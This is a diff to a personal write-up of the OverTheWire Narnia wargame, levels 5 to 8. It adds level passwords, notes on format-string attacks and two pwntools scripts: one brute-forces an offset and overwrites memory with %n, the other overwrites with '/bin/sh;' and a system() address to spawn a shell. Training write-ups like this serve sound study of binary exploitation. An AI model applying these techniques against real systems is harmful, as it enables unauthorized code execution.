@@ -224,22 +224,126 @@ Essentially narnia2??? the enviromental variables are set to Null so, we cant us
 https://man7.org/linux/man-pages/man7/environ.7.html
 
 ## narnia5 :  faimahchiy
-Very cool easy challenge about overwriting an address in format string, 
+Very cool easy challenge about overwriting an address using format string, 
+https://cs155.stanford.edu/papers/formatstring-1.2.pdf
+it was my source of reference to learn about this attack. basic gist of it was, first I wrote some arbitary bytes with the address I wanted to overwrite, then i brute forced to get the offset to the where my address is situated this would where we use spooky `%n` to write values to, since i printed `36` bytes already, we need `500-36` to be the `%(500-36)u%n` to overwrite the address. 
+Really made me understand how printf works :), script here
 
+```python
+from pwn import *
+
+  
+
+shell = ssh('narnia5', 'narnia.labs.overthewire.org', password='faimahchiy', port=2226)
+
+ad = 0xffffdcd0
+
+for i in range(0,100):
+
+a= b"A"*(64-32)+p32(ad)+(f'%{i}$08x').encode()
+
+  
+
+print(a,i)
+
+p = shell.process(["/narnia/narnia5",a])
+
+  
+
+(p.recvline())
+
+buf = (p.recvline())
+
+print(buf)
+
+buf =buf.split(b"[")[1].strip().split(b"]")[0][-8:]
+
+if buf[0:2]!=b"0x":
+
+buf = b"0x"+buf
+
+print(buf)
+
+pointer = (p.recvline())
+
+pointer =pointer.split(b"(")[1].strip().split(b")")[0]
+
+  
+
+print(pointer)
+
+if buf==pointer or buf==p32(ad):
+
+p.close()
+
+  
+
+loca = (i)
+
+payload = b"A"*(64-32)+p32(ad)+b"%464u"+(f'%{loca}$n').encode()
+
+print(payload)
+
+p = shell.process(["/narnia/narnia5",payload])
+
+p.interactive()
+
+break
+
+  
+
+p.close()
+```
 
 ## narnia6 : neezocaeng
+argument 1 overwrite with "/bin/sh;" + overwrite with system address 
+argument 2 nothing
+ignore some parts of the code, as it was me trying to figure out alternative way to get system addreses in libc in pwntools, keeping it here as a reference.
+```python
+from pwn import *
+
+shell = ssh('narnia6', 'narnia.labs.overthewire.org', password='neezocaeng', port=2226)
+
+libc = ELF("./libc.so.6")
+
+# e = ELF("/narnia/narnia6")
+
+binsh_sr = p32(next(libc.search(b"/bin/sh")))
+
+system_add = p32(0xf7e4c850)
+
+print(binsh_sr)
+
+# 16 to write
+
+payload = cyclic(8)
+
+  
+
+payload = b"/bin/sh;"
+
+payload+=system_add
+
+  
+
+print(payload)
+
+p = shell.process(["/narnia/narnia6",payload,b""])
+
+p.interactive()
+```
 
 
+## narnia7 : ahkiaziphu
 
-## narnia7 : 
+formatstring, but you bruteforce until you edit the correct address, my script initially would hang at iteration 10, but would be fine at every at iteration, soon i realised, it was where the flag was :D. 
 
 
-## narnia8 : 
+## narnia8 :  mohthuphog
+
+
 
 
 ## narnia9 : 
-
-
-
 
 
